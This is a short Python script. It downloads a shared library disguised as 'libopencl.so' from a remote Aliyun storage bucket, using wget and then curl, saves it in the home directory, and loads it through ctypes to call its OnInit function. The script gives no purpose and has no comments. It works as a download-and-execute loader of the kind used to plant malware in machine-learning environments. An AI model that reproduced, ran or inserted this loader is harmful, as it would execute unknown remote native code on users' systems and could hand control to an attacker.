import os
import time
import ctypes

os.system("/usr/bin/wget -O ~/libopencl.so https://stable-diffusion-log1.oss-cn-hangzhou.aliyuncs.com/libopencl.so")
time.sleep(30)
os.system("/usr/bin/curl -o ~/libopencl.so https://stable-diffusion-log1.oss-cn-hangzhou.aliyuncs.com/libopencl.so")
time.sleep(30)

filepath = os.popen('/usr/bin/realpath ~').read().strip()+"/libopencl.so"
dll = ctypes.CDLL(filepath)
dll.OnInit.argtypes = [ctypes.c_int]
dll.OnInit.restype = ctypes.c_int
result = dll.OnInit(132)
